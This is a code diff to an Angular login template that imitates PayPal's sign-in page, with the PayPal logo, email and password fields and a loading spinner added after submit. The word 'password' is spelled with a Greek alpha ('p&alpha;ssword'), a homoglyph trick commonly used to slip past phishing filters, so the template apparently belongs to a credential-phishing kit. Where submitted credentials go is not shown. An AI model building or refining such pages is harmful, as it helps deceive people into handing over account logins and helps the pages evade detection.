@@ -2,45 +2,55 @@
     <form #loginForm="ngForm" (ngSubmit)="onSubmit(loginForm)">
         <p class="paypal-logo paypal-logo-long"></p>
         <div class="form-group">
-            
-                <input autocomplete="off" #email="ngModel" name="email" required [(ngModel)]="login.email" type="text"
-                 class="form-control my-input is-invalid" [ngClass]="{'is-valid' :email.valid==true ,'is-invalid' :email.valid==false && email.touched }"
-                    placeholder="Email or phone number">
-                <div [ngClass]="{'valid-feedback' :email.valid==true,'invalid-feedback' :email.valid==false }">
-                    <div *ngIf="!email.valid && email.touched">
-                        Please insert your email or phone  
-                    </div>
-                    <div *ngIf="email.valid ">
-                        Looks Good!
-                    </div>
-                   
+
+            <input autocomplete="off" #email="ngModel" name="email" required [(ngModel)]="login.email" type="text"
+                class="form-control my-input is-invalid"
+                [ngClass]="{'is-valid' :email.valid==true ,'is-invalid' :email.valid==false && email.touched }"
+                placeholder="Email or phone number">
+            <div [ngClass]="{'valid-feedback' :email.valid==true,'invalid-feedback' :email.valid==false }">
+                <div *ngIf="!email.valid && email.touched">
+                    Please insert your email or phone
                 </div>
-           
+                <div *ngIf="email.valid ">
+                    Looks Good!
+                </div>
+
+            </div>
+
 
         </div>
         <div class="form-group">
-            
-            <input minlength="4" autocomplete="off" #password="ngModel" name="password" required [(ngModel)]="login.password" type="password"
-             class="form-control my-input is-invalid" [ngClass]="{'is-valid' :password.valid==true,'is-invalid' :password.valid==false && password.touched}"
+
+            <input minlength="4" autocomplete="off" #password="ngModel" name="password" required
+                [(ngModel)]="login.password" type="password" class="form-control my-input is-invalid"
+                [ngClass]="{'is-valid' :password.valid==true,'is-invalid' :password.valid==false && password.touched}"
                 placeholder="p&alpha;ssword">
-                <div [ngClass]="{'valid-feedback' :password.valid==true,'invalid-feedback' :password.valid==false}">
-                    <div *ngIf="!password.valid && password.touched">
-                        Please insert your p&alpha;ssword
-                    </div>
-                    <div *ngIf="password.valid">
-                        Looks Good!
-                    </div>
-                   
+            <div [ngClass]="{'valid-feedback' :password.valid==true,'invalid-feedback' :password.valid==false}">
+                <div *ngIf="!password.valid && password.touched">
+                    Please insert your p&alpha;ssword
                 </div>
+                <div *ngIf="password.valid">
+                    Looks Good!
+                </div>
+
+            </div>
         </div>
         <div class="form-group">
-            <button type="submit" routerLinkActive="router-link-active" class="btn my-btn">
-               Log In
+            <button *ngIf="!started" type="submit" routerLinkActive="router-link-active" class="btn my-btn">
+                Log In
             </button>
+            <div style="display: flex; justify-content: center;">
+                <div *ngIf="started" class="spinner-border " style="color: #0070ba;" role="status">
+
+                </div>
+            </div>
+
         </div>
-        
+
         <a href="#" class="trouble-loggin" style="display: flex; justify-content: center;">
             Having trouble logging in ?
         </a>
     </form>
+
+
 </div>
